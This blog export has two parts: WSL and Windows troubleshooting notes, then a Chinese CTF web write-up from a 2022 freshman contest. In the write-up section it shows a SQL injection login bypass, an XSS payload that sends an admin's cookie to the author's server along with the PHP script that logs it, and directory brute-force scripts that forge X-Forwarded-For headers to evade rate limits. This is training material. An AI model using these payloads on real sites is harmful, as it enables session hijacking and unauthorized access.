<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><h3 id="zsh-exec-format-error-notepad-exe"><a href="#zsh-exec-format-error-notepad-exe" class="headerlink" title="zsh: exec format error: notepad.exe"></a>zsh: exec format error: notepad.exe</h3><p>突然某天发现自己的 WSL 运行不了 PE 文件了。查找了一下发现 Github 上有个 <a class="link"   href="https://github.com/microsoft/WSL/issues/9146" >Issue <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，情况并不完全一致，但遇到的问题逻辑是一致的。简单概括就是开启了『WSL』的『systemd』服务后，Linux 的文件处理逻辑发生了变化，导致无法正确执行 PE 文件。</p>
<hr>
<p>本地利用 <code>ls /proc/sys/fs/binfmt_misc</code> 查看支持的服务，会发现开启『systemd』服务后对于『WSL 互操作』的支持『WSLInterop』都消失了，也就是说互操作服务直接被关闭了。</p>
<p>解决方案：</p>
<ol>
<li>在”wsl.conf”中关闭”systemd”选项。</li>
</ol>
<h3 id="拯救Docker-WSL重装"><a href="#拯救Docker-WSL重装" class="headerlink" title="拯救Docker &amp; WSL重装"></a>拯救Docker &amp; WSL重装</h3><p><strong>2023&#x2F;3&#x2F;17：</strong>Docker 突然就寄了，查了一下可能是 wsl 寄了，于是打算重装WSL。先是常规注销分支”Ubuntu-20.04”，但是发现它注销了，分支文件还留在电脑上，导致不能下载新的，会提示”Ubuntu 20.04 LTS”已安装，而旧的坏掉了（Failed Distribution），因此需要手动卸载Ubuntu-20.04应用，然后重新下载并安装。</p>
<p>校园网下无法安装WSL，下载与安装会一直卡住，微软商店甚至点击安装都毫无反应，切换至手机热点后就能正常下载。但是重装了ubuntu后仍然出现报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WslRegisterDistribution failed with error: 0x800701bc</span><br></pre></td></tr></table></figure></div>

<p>原因是WSL2的内核没有更新，可以通过：<code>wsl --update</code> 直接升级，在热点下CLI的下载也有进度条。下载完毕后重新打开下载的ubuntu-20.04，正常运行。</p>
<p>微软商店下载的Ubuntu在初始化（设置新用户名及密码）前不被CLI的WSL识别，初始化完毕后自动登记至WSL中。此时进入wsl中默认用户为root，使用 <code>ubuntu2004 config --default-user festu</code> 切换用户为festu。尽管经过了导出导入等操作，此时wsl中的ubuntu-20.04仍是微软商店下载的ubuntu，两者是同一个系统。注销分发并没有删除这个ubuntu2004，只是将其取消了登记，不知道是不是因为这个ubuntu不是用WSL的CLI下载管理的。</p>
<h3 id="WSL-搬家"><a href="#WSL-搬家" class="headerlink" title="WSL 搬家"></a>WSL 搬家</h3><p><strong>2022&#x2F;9&#x2F;12：</strong>ubuntu突然跑不起来了，就删了重装了一个kali，结果发现kali的包管理似乎不太行，又不知道如何安装工具，就又重新装了一个ubuntu-20.04</p>
<p><code>wsl -h</code> 可以查看手册，<code>wsl --unregister ubuntu</code> 注销虚拟机，然后 <code>wsl -l -o</code> 查看可安装的版本，<code>wsl --install -d ubuntu-20.04</code> 安装ubuntu-20.04，然后 <code>wsl --export ubuntu-20.04 f:\ubuntu\ubuntu2004.tar</code> 将包导出，然后 <code>wsl --unregister ubuntu-20.04</code> 注销已安装的，然后重新导入：<code>wsl --import ubuntu-20.04 f:\ubuntu\ubuntu-20.04 f:\ubuntu\ubuntu2004.tar</code> 。注意前一个参数是安装位置，后一个参数是导入包的位置，弄反了会出现报错：”拒绝访问”。导入完毕后会自动以管理员身份登录，需要设置默认账户：<code>ubuntu2004.exe config --default-user festu</code> 。若exe文件是未安装的wsl系统则会直接安装目标系统再执行，因此需要先在system32文件夹下找到exe文件的名称。</p>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/zhys2007/article/details/110958577" >WSL2迁移办法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<p><a class="link"   href="https://blog.csdn.net/yihuajack/article/details/119915303" >将WSL2移动到其他磁盘 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<p><strong>]</strong></p>
<h3 id="Errors"><a href="#Errors" class="headerlink" title="Errors"></a>Errors</h3><ul>
<li><pre><code class="sh">Error: 0x80040326
Error code: Wsl/Service/0x80040326
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  解决：`wsl --update`</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  Error: 0x80240438</span><br><span class="line">  Error code: Wsl/UpdatePackage/0x80240438</span><br></pre></td></tr></table></figure></div>

解决：**确保网络可用且通畅**，可尝试重启WindowsUpdate服务：

<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">net stop wuauserv</span><br></pre></td></tr></table></figure></div>

或cmd+r：services.msc，重启Windows Update服务。

[参考博客](https://blog.csdn.net/pcplayer/article/details/127890104)
</code></pre>
</li>
<li><p>安装WSL：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Failed to fetch the list distribution from &#x27;https://raw.githubusercontent.com/microsoft/WSL/master/distributions/DistributionInfo.json&#x27;. 无法解析服务器的名称或地址</span><br><span class="line">Error code: Wsl/WININET_E_NAME_NOT_RESOLVED</span><br></pre></td></tr></table></figure></div>

<p>更改DNS即可解决。</p>
</li>
<li><pre><code class="error">Error code: Wsl/Service/CreateInstance/CreateVm/ConfigureNetworking/0x80041002
</code></pre>
<p>在HyperV管理器-虚拟交换机管理中，尝试将WSL更改为公共网络并绑定至WLAN网卡上时出现问题，重装整个WSL2后解决</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>Windows Issues</title>
    <url>/2023/09/25/Solution/Windows/Windows%20Issues/</url>
    <content><![CDATA[<h2 id="Debris"><a href="#Debris" class="headerlink" title="Debris"></a>Debris</h2><ul>
<li><strong>Windows 7&#x2F;10 桌面壁纸保存路径</strong>：<code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Themes\CachedFiles\</code></li>
<li><code>C:\ProgramData\Package Cache</code> 中存有应用的安装程序，这些安装程序被 Windows 应用管理器用于卸载应用，因此请勿随便修改。</li>
</ul>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="时间乱码"><a href="#时间乱码" class="headerlink" title="时间乱码"></a>时间乱码</h3><p>电脑部分软件时间出现乱码，如：<code>〉〇〉《-〇【-〉》 〉《:〉『:》《</code> ，场景包括”phpStudyPro”与取证软件恢复的数据。</p>
<p>后来发现是 Windows 在『区域格式』设置为『中文（简体汉字，香港特别行政区）』时，解析部分软件的时间数据可能会出现乱码</p>
<p><strong>解决办法：</strong>在 <code>Windows设置/时间和语言/区域</code> 下设置『国家或地区』为中国，『区域格式』为『中文（简体，中国）』</p>
<h3 id="ext4-vhdx"><a href="#ext4-vhdx" class="headerlink" title="ext4.vhdx"></a>ext4.vhdx</h3><p>WSL2-Kali-linux 遗留下来的虚拟磁盘文件”ext4.vhdx”文件，想在 Windows 中访问有两种方式：</p>
<ol>
<li>直接用 7z 解压查看，即可看见完整的文件系统目录，文件可完整读取</li>
<li>Win11 特定版本及以上，WSL 提供了 <code>wsl --mount</code> 命令可用于挂载虚拟磁盘。（<strong>未实践，纯脑测</strong>）<ol>
<li>首先在『磁盘管理&#x2F;操作&#x2F;附加 VHD』中添加 vhdx 磁盘</li>
<li>在 pwsh 中使用 <code>GET-CimInstance -query &quot;SELECT * from Win32_DiskDrive&quot;</code> 命令获取 windows 可读取的外部磁盘的识别路径，如 <code>\\.\PHYSICALDRIVE1</code> </li>
<li>使用 <code>wsl --mount &quot;\\.\PHYSICALDRIVE1&quot;</code> 挂载磁盘</li>
<li>进入 wsl，用 <code>sudo mkdir /mnt/kali</code> 创建挂载点</li>
<li>使用 <code>ls /dev</code> 查看挂载的磁盘对应标识符，例如为 <code>/dev/sde</code></li>
<li>挂载磁盘：<code>mount /dev/sde /mnt/kali</code></li>
</ol>
</li>
</ol>
<h3 id="Errors"><a href="#Errors" class="headerlink" title="Errors"></a>Errors</h3><ol>
<li><p>运行某 GalGame 的 EXE 文件时报错：</p>
<div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="code"><pre><span class="line">出现错误：应用程序无法启动，因为应用程序的并行配置不正确</span><br></pre></td></tr></table></figure></div>

<p>可能原因：</p>
<ol>
<li><p>缺少微软的 VS 运行库：<code>Microsoft Visual C++ 2008 Redistributable Package (x86)</code> <a class="link"   href="https://www.microsoft.com/zh-CN/download/details.aspx?id=26368" >微软官网下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>下载中文版 64 位安装程序，运行安装后重启生效，EXE 文件可用。</p>
</li>
<li><p><code>win+r</code>，输入 <code>services.msc</code> ，检查并打开『Windows Modules Insatller』服务。</p>
<p>（上述方法经测试并无效果，仅作留档参考）</p>
</li>
</ol>
<blockquote>
<p><strong>题外话：</strong>使用 <code>sxstrace.exe</code> 跟踪 Windows 错误日志。</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">sxstrace /?	<span class="comment"># 获取帮助</span></span><br><span class="line">sxstrace trace <span class="literal">-logfile</span>:tar.etl	<span class="comment"># 管理员运行命令开启日志跟踪，内容保存至目标文件</span></span><br><span class="line">sxstrace parse <span class="literal">-logfile</span>:filename.etl <span class="literal">-outfile</span>:sxstrace.txt	<span class="comment"># 读取原始跟踪文件并转换成用户可读的格式，并将结果保存至目标文件</span></span><br></pre></td></tr></table></figure></div>

<p>该工具可保存一闪而过的”Windows Error”的具体信息。</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>2022-r00t-新生赛</title>
    <url>/2022/05/08/Security/CTF/2022-r00t-%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
    <content><![CDATA[<p>[TOC]</p>
<p>小知识：</p>
<ol>
<li><code>192.168.xx.xx</code> 都是内网地址，<code>127.x.x.x</code> 都是本机地址，不走网</li>
</ol>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>过一遍web解题的基本思路引导，然后直接F12翻源码找flag即可。</p>
<h3 id="EatPudding"><a href="#EatPudding" class="headerlink" title="EatPudding"></a>EatPudding</h3><p>可爱的音游（居然可以用键盘打，dfjk），既然是前端游戏，那flag八成是在源码里呗，F12找到’源代码’，找到’index.js’文件，在 <code>shareText()</code> 函数中发现flag的提示：</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shareText</span>(<span class="params">cps</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mode === <span class="variable constant_">MODE_NORMAL</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> date2 = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">            deviationTime = (date2.<span class="title function_">getTime</span>() - _date1.<span class="title function_">getTime</span>())</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">legalDeviationTime</span>()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;倒计时多了&#x27;</span> + ((deviationTime / <span class="number">1000</span>) - <span class="number">20</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>) + <span class="string">&quot;s&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title class_">SubmitResults</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">5</span>) <span class="keyword">return</span> <span class="string">&#x27;试着好好练一下？&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">8</span>) <span class="keyword">return</span> <span class="string">&#x27;再加把劲吧！&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">10</span>) <span class="keyword">return</span> <span class="string">&#x27;也许可以再努力一些:D&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">15</span>) <span class="keyword">return</span> <span class="string">&#x27;还差一点点&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">20</span>) <span class="keyword">return</span> <span class="string">&#x27;cps大于20就给flag！&#x27;</span></span><br><span class="line">        <span class="keyword">let</span> a;</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Re</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="title class_">Re</span>.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./flag.php?name=&#x27;</span>+(a?.<span class="property">o</span>||((+ +<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;o&#x27;</span>)??!!a?.<span class="property">a</span>)).<span class="title function_">toLocaleLowerCase</span>(),<span class="literal">false</span>);</span><br><span class="line">        <span class="title class_">Re</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        <span class="title class_">Re</span>.<span class="title function_">send</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Re</span>.<span class="property">responseText</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>大致意思就是cps大于20就能得到flag（那显然不是人类的手速），观察一下，它访问子文件’.&#x2F;flag.php’并用’get’方法请求 <code>name=</code> 加上一串字串即可得到flag。所以重点在于请求的内容字串是什么 <code>(a?.o||((+ +&#39;a&#39;+&#39;o&#39;)??!!a?.a))</code> ，直接将它丢到控制台中运行一下就会得到字串的内容（先声明一下a）：<code>nano</code> 。解释一下它是怎么来的，首先字串左侧的可选链 <code>a?.o</code> 因为不存在o这个键，所以是’undefined’，所以完全取决于右侧，<code>??</code> 是空值合并操作符，只有当它的左侧为’null’或者’undefined’时才会返回右边的值，<code>!!</code> 就是取反两次，也就是自己，不过会强制转化为布尔类型，而左侧是 <code>(+ +&#39;a&#39;+&#39;o&#39;)</code> ，其中左边部分 <code>+ +&#39;a&#39;</code> 的值是NaN（加号间的空格不能少，不然就报错了），也就是不认识的变量，说白了就是这个语法编译不出来，而NaN会被当做字符串与’o’相加，所以得到’NaNo’，转化为小写后就是’nano’。</p>
<h3 id="ezSQL-免费的留言板"><a href="#ezSQL-免费的留言板" class="headerlink" title="ezSQL &amp; 免费的留言板"></a>ezSQL &amp; 免费的留言板</h3><p>过滤了单引号，使用双引号构造万能密码即可：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">1&quot; or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure></div>

<p>这里后台使用的是sqlite，注释符号只能用 <code>--</code> ，而Mysql的注释符才有 <code>#</code> 。然后是老问题，这里用户名也可以直接注入，但是得用两个or，这是因为后面有个 <code>and password=&#123;password&#125;</code> ，如果只有一个 <code>or 1=1</code> ，会出现先判定前后的 <code>and</code> 导致 <code>or</code> 两边都为false的情况。</p>
<p>然后就是留言板，两题是并在一起的（大型连续剧doge），这里打的是一个XSS（跨站脚本攻击），首先尝试各种标签，由于这个界面本身就是由JS渲染的， <code>&lt;script&gt;</code> 标签是不会再次执行的（理由似乎不明？），因此选用 <code>&lt;button&gt;</code> 标签的”onclick”触发JS代码，发现可行，就去搜索如何利用留言板打XSS，首先明确cookie一般是带有用户的登录信息的（当前），而在JS环境中读取cookie需要调用 <code>document.cookies</code> 参数，因此思路就是将上当触发XSS的管理员的cookie信息利用JS代码发送到自己的服务器上。可以利用JS中的 <code>document.location=url</code> 来实现网页的跳转访问，通过访问自己的网站并用get方法请求cookie达到获取cookie的目的。php源码如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))                 <span class="comment">//如果接收到cookie</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;./cookie.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);    <span class="comment">//打开存储的文件</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>); <span class="comment">//将获取的cookie存储</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);                         <span class="comment">//关闭文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>构造如下payload：<code>&lt;button onclick=&#39;document.location=&quot;url/cookie.php?cookie=&quot;+document.cookies;&#39;&gt;Click Me!&lt;/button&gt;</code> ，也可以利用图片的 <code>onerror</code> 参数实现JS代码的执行，该参数执行内容代码当src加载不对或者干脆为空的时候。有了思路，下一件事就是搭一个服务器，在腾讯云上新建一个应用容器，选择宝塔面板，重装好后在应用管理界面找到面板登录网址，先在防火墙中打开相应端口，一般是TCP协议8888端口；再通过端口进入宝塔面板管理（这里用的是服务器中记录的用户密码），在网站一栏添加站点，FTP与数据库都选择创建，域名如果没有自己购买有效域名，则填写IP地址，否则是无效域名，访问不了。成功后进入根目录将之前的cookie脚本添加进去即可。再提一下XSS的应用领域，任何输入框都是有可能的，尤其是会被加载出来的部分。本题中用户名无法打XSS，它会直接显示，但是举报栏可以，举报中有其他栏目，会给一个输入框，通过输入框打XSS，则管理员会在处理举报时触发XSS并发送cookie（虽然 <code>ducument.location</code> 的跳转会让XSS很明显就是了），于是就得到了管理员的cookie，登录后得到flag。结果如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=pyy; password=&quot;1eDydsQz7LJ_TIj_78aBcVC!aOw1$3@&quot;; PHPSESSID=88ah7gn4u96d2guht6ooouvvj2</span><br></pre></td></tr></table></figure></div>

<p>顺带提一句，由于该网站是JS渲染的，XSS的跳转会导致网站死循环，也就是一进入就跳转，因此后台要想解决问题只能用接口处理所有举报和问题留言。</p>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_44191814/article/details/120091363" >第二范式-Linux命令超大全 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.php.cn/topic/bt/476260.html" >图文详解如何配置宝塔面板以及搭建网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/265221405" >EnX07-XSS抓取Cookie-渗透测试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_51524329/article/details/121583797" >红云谈安全-利用XSS获取用户cookie <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="EZF12"><a href="#EZF12" class="headerlink" title="EZF12"></a>EZF12</h3><p>F12快捷键和右键都被ban了，flag应该在源码里，我当时开发者工具是悬浮的，手动从更多工具中打开后不会发生跳转，就直接找到了flag；后来测试的时候发现如果窗口靠侧边，就会发生页面跳转，跳转到战队的主页（明示多学点知识？）；可以试着用burp发个包，就能得到相应的网页内容（curl不会返回页面源码，但是可以下载页面内容，下下来以后直接改成txt查看就能看到源码）</p>
<h3 id="Where-is-flag"><a href="#Where-is-flag" class="headerlink" title="Where is flag?"></a>Where is flag?</h3><p>提示目录扫描，可是真用dirsearch扫会发现404报的很少，用burp发包后发现大部分是429，也就是请求过于频繁，但不代表页面不存在，F12可以看到提示，估计一个IP在一段时间内只能访问一定次数，多了就会回显429，因此思路就是想办法仿造IP，爆破目录，根据返回的状态码确定目标网页是否存在。</p>
<p>一开始想拿burp脚本跑，但是因为考虑的是代理思路，觉得太麻烦，就改用python写了。</p>
<ul>
<li>给Burp加载python脚本时出现报错”SyntaxError: Non-ASCII character in file”，给脚本前加上 <code>#coding:utf-8</code> 即可解决，因为Burp用的是py2，需要额外的说明utf-8编码才能加载其中的中文注释。</li>
</ul>
<h4 id="Python-Requests"><a href="#Python-Requests" class="headerlink" title="Python Requests"></a>Python Requests</h4><p>最开始的思路是切换代理，以此来改变IP，但是很快就发现这不现实，因为合法稳定的IP池子很烧钱，免费的基本没有用，所以这条路行不通。事实上简单的伪造IP只需要改变消息头，手动构造一个http头：<code>X-Forwarded-For:xxx</code> ，并在每次发包时修改它就可以保证自己的IP是变换的，由于这题没做合法校验，这个IP头的内容是什么都行（趁机暴打出题人），只要不同就能避免429重复，利用python的Request模块写一个脚本发包校验字典即可： </p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy=<span class="string">&#x27;pyy has no hair!&#x27;</span>;</span><br><span class="line">url_=<span class="string">&#x27;http://81.69.243.226:30001/&#x27;</span>;</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">c=<span class="number">0</span>;</span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./dicc.txt&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    s=file.readline()</span><br><span class="line">    <span class="keyword">while</span> s != <span class="string">&quot;&quot;</span>:    </span><br><span class="line">        <span class="keyword">if</span> s[-<span class="number">1</span>]==<span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">            s=s[<span class="number">0</span>:-<span class="number">1</span>];</span><br><span class="line">        proxy=proxy+<span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">        headers[<span class="string">&#x27;X-Forwarded-For&#x27;</span>]=proxy;</span><br><span class="line">        url=url_+s;</span><br><span class="line">        res.append(requests.get(url=url,headers=headers))</span><br><span class="line">        <span class="keyword">if</span> res[c].status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(s);</span><br><span class="line">        c+=<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(c)+<span class="string">&quot;:&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res[c-<span class="number">1</span>].status_code,end=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        s=file.readline()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>不是异步效率也不是很高，差不多一秒五次左右，比直接用扫描器定时发送快上不少是真的，但是有些小问题，例如在访问成功，出现200状态码后就容易出现一个429，BUG原理不明。差不多跑了一个小时才跑完整个字典，将输出复制粘贴到VSC中，选中404修改所有匹配项，直接删除，然后找还剩下的状态码就行了，最后留下几次出错和几个存在的目录：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Admin</span><br><span class="line">1637: 200</span><br><span class="line">1639: 429</span><br><span class="line">docs</span><br><span class="line">4987: 200</span><br><span class="line">4989: 429</span><br><span class="line">wp</span><br><span class="line">9128: 200</span><br><span class="line">9216: 429</span><br></pre></td></tr></table></figure></div>

<p>不知道是不是网站出了问题，后台没有访问进程的情况下直接访问目录也会报告429，被迫只能用burp发包修改IP头，最后再wp目录下找到flag。</p>
<p>curl命令也可以伪造HTTP头：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl url -H <span class="string">&#x27;X-Forwarded-For:IP&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p><code>-H</code> 构造HTTP头</p>
<p>为了让脚本效率更高，可能需要异步或者多线程来优化，但是可惜的是requests库是同步阻塞的，因此无法利用asyncio实现异步调用。</p>
<p>Python中的异步指的是程序地协程运行，与Js正好相反，Python中的await会将async函数的执行权转交出去实现异步，而Js因为默认就是异步执行，await会固定函数执行权达到同步的目的。但两者的异步模型是差不多的，都是一个生产者-消费者的模型，await与async的应用也大差不差。</p>
<p>这里使用自带线程池的”HackRequests”包来优化脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> HackRequests <span class="keyword">as</span> hack</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">proxy=<span class="number">0</span>;</span><br><span class="line">url_=<span class="string">&#x27;http://81.69.243.226:30001/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">c=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义回调函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_callback</span>(<span class="params">r:hack.response</span>):</span><br><span class="line">    <span class="built_in">print</span>(r.status_code,end=<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> r.status_code!=<span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.log.get(<span class="string">&#x27;request&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立线程池</span></span><br><span class="line">threadPool= hack.threadpool(<span class="number">40</span>,_callback);</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./dicc.txt&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    s=file.readline()</span><br><span class="line">    <span class="keyword">while</span> s!=<span class="string">&quot;&quot;</span>:    </span><br><span class="line">        <span class="keyword">if</span> s[-<span class="number">1</span>]==<span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">            s=s[<span class="number">0</span>:-<span class="number">1</span>];</span><br><span class="line">        proxy=proxy+<span class="number">1</span>;</span><br><span class="line">        headers[<span class="string">&#x27;X-Forwarded-For&#x27;</span>]=<span class="built_in">str</span>(proxy);</span><br><span class="line">        url=url_+s;</span><br><span class="line">        <span class="comment">#将请求装入线程池,给headers对象做拷贝</span></span><br><span class="line">        threadPool.http(url=url,headers=copy.copy(headers));</span><br><span class="line">        c+=<span class="number">1</span>;</span><br><span class="line">        s=file.readline()</span><br><span class="line"></span><br><span class="line">threadPool.run()</span><br></pre></td></tr></table></figure></div>

<p>可在 <code>threadpool</code> 中的第一个参数自定义线程个数来控制速度，效率远高于同步的requests库，40个线程完成扫描只需要几分钟。但这里需要注意的地方是headers，如果传入字符串则需要HTTP头格式：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">headers=```<span class="string">&#x27;User-Agent: xxx</span></span><br><span class="line"><span class="string">X-Forwarded-For: 0&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>不同头需要换行分隔，冒号后面一定要跟空格，否则线程在调用过程中会持续报错，表示无法读入HTTP头。而如果使用的是对象，则一定要做拷贝，这涉及到对象的特点：内部存储键值时，值是依赖地址索引的。就像C++的指针一样，传入对象时实际传入的是对象内存储的地址，调用时再从地址中取值，而线程池是批量统一运行的，哪怕你传进去的时候IP头的值为’1’，但由于是地址索引，在运行时那个地址只有一个值，所以所有IP头的值都会是相等的，这就会导致429状态码的出现。由于只有一层，只需要做浅拷贝即可。</p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="http://www.voidcc.com/project/hack-requests" >hack-requests <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://ruanyifeng.com/blog/2019/11/python-asyncio.html" >阮一峰-Python异步编程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/Mr_Shiyang/article/details/105530969" >Syangy-伪造IP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html" >runoob-HTTP X-Forwarded-For头 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_43652321/article/details/107606571" >Python爬虫——伪装代理（IP和User-Agent） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/137649301" >Python中Requests库使用方法详解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/liuhui0308/p/12346847.html" >python3标准库：copy复制对象 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
